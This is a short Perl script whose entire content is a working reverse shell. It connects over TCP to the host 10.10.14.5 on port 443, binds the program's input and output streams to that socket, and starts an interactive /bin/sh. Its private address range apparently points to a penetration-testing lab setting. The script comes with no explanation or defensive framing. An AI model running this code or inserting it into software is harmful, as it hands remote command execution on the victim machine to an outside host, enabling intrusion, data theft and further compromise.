use Socket;

$i="10.10.14.5";
$p=443;

socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));

if(connect(S,sockaddr_in($p,inet_aton($i)))){
	open(STDIN,">&S");
	open(STDOUT,">&S");
	open(STDERR,">&S");
	exec("/bin/sh -i");
};